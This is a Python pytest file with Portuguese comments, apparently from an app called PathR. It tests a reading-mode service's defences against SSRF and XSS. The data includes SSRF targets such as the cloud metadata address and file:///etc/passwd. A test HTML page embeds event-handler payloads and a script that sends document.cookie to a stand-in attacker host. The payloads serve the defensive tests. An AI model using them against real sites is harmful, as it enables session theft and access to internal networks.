"""Modo leitura: as duas guardas e a extracao.

Um "baixe esta URL no servidor" tem dois jeitos classicos de dar errado, e os
dois sao testados aqui porque nenhum aparece em uso normal -- so aparecem no
dia em que alguem tenta.

1. SSRF. A url vem da nossa tabela, mas os recursos nascem de uma busca na
   web: nao sao digitados por nos. Um resultado apontando para 169.254.169.254
   faria o backend buscar, com a credencial de rede DELE, algo que o usuario
   jamais alcancaria.

2. XSS. O HTML vem de terceiro e e renderizado na NOSSA origem. Sem limpar,
   quem controlasse a pagina de origem executaria script no PathR.

Offline: nada aqui vai a rede. A extracao roda sobre HTML escrito no teste.
"""

import pytest

from app.services import reader


# ---------------------------------------------------------------------------
# SSRF
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "http://169.254.169.254/latest/meta-data/",  # metadados da nuvem
        "http://127.0.0.1:8031/health",
        "http://localhost:8031/health",
        "http://10.0.0.5/",
        "http://192.168.1.1/",
        "http://[::1]/",
        "file:///etc/passwd",
        "ftp://exemplo.com/arquivo",
        "gopher://exemplo.com/",
        "http://0.0.0.0/",
    ],
)
def test_endereco_interno_ou_esquema_estranho_e_recusado(url):
    assert reader._url_permitida(url) is False


def test_endereco_publico_e_aceito():
    assert reader._url_permitida("https://git-scm.com/docs/gittutorial") is True


def test_host_que_nao_resolve_e_recusado():
    """Nao resolver e motivo para nao tentar: sem endereco nao ha como
    conferir se e publico."""
    assert reader._url_permitida("https://dominio-que-nao-existe.invalid/x") is False


# ---------------------------------------------------------------------------
# Sanitizacao
# ---------------------------------------------------------------------------

# Um documento REALISTA, e nao um paragrafo solto: o extrator decide o que e
# artigo por densidade de texto, e num HTML minusculo ele achata tudo num
# paragrafo so -- o que faria o teste medir o extrator no seu pior caso em vez
# de no caso que a tela vai encontrar. Em artigo de verdade a estrutura e
# preservada (medido: 80 e 108 blocos <pre> nos artigos da biblioteca).
PAGINA = """
<html><head><title>Guia</title></head><body>
<nav>menu que nao interessa</nav>
<article>
  <h1>Como usar GitHub Actions</h1>
  <p>Passo 1: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 1.</p>
  <p>Passo 2: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 2.</p>
  <p>Passo 3: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 3.</p>
  <p>Passo 4: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 4.</p>
  <p>Passo 5: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 5.</p>
  <p>Passo 6: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 6.</p>
  <p>Passo 7: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 7.</p>
  <p>Passo 8: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 8.</p>
  <p>Passo 9: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 9.</p>
  <p>Passo 10: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 10.</p>
  <p>Passo 11: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 11.</p>
  <h2>Escrevendo o primeiro workflow</h2>
  <p>Um workflow roda a cada <strong>push</strong>. Veja
     <a href="/docs/exemplo" onclick="roubar()">o exemplo</a> abaixo, que cobre
     o caso mais comum de integracao continua em projetos pequenos.</p>
  <pre><code>on: push
jobs:
  build:
    runs-on: ubuntu-latest</code></pre>
  <p><img src="/img/fluxo.png" alt="fluxo" onerror="roubar()"> O diagrama acima
     mostra a ordem em que os jobs sao disparados quando ha dependencia entre
     eles declarada com needs.</p>
  <script>fetch('https://mau.exemplo/'+document.cookie)</script>
  <iframe src="https://mau.exemplo/"></iframe>
  <p onmouseover="roubar()" style="display:none">texto com armadilha escondido
     do leitor por css, que e exatamente o que a limpeza precisa remover.</p>
</article>
<footer>rodape</footer>
</body></html>
"""


@pytest.fixture
def leitura(monkeypatch):
    monkeypatch.setattr(reader, "_baixar", lambda _url: PAGINA)
    return reader.ler("https://exemplo.com/artigo")


def test_script_e_iframe_nao_sobrevivem(leitura):
    assert "<script" not in leitura.html
    assert "<iframe" not in leitura.html
    assert "document.cookie" not in leitura.html


def test_manipulador_de_evento_e_removido(leitura):
    """`onclick`, `onerror` e `onmouseover` executam sem clique nenhum em
    alguns casos, e rodariam na nossa origem."""
    for atributo in ("onclick", "onerror", "onmouseover"):
        assert atributo not in leitura.html


def test_style_inline_e_removido(leitura):
    """`display:none` num paragrafo esconderia texto do leitor sem que ele
    saiba, e `style` e vetor de ataque por si."""
    assert "style=" not in leitura.html


def test_o_conteudo_do_artigo_permanece(leitura):
    """Limpar nao pode significar esvaziar."""
    assert "GitHub Actions" in leitura.html
    assert "workflow" in leitura.html


def test_bloco_de_codigo_sobrevive(leitura):
    """E o que torna o modo leitura util para artigo tecnico: sem <pre>, o
    yaml vira uma linha corrida e o artigo perde justamente a parte que a
    pessoa foi ler."""
    assert "<pre>" in leitura.html
    assert "runs-on: ubuntu-latest" in leitura.html


def test_titulos_e_links_sobrevivem(leitura):
    assert "<h" in leitura.html
    assert "<a " in leitura.html


def test_conta_as_palavras_do_texto(leitura):
    """A contagem alimenta o "x min de leitura" da tela."""
    assert leitura.palavras > 5


def test_pagina_sem_artigo_extraivel_avisa(monkeypatch):
    monkeypatch.setattr(reader, "_baixar", lambda _url: "<html><body></body></html>")
    with pytest.raises(reader.LeituraIndisponivel) as erro:
        reader.ler("https://exemplo.com/vazio")
    assert "extrair" in erro.value.motivo
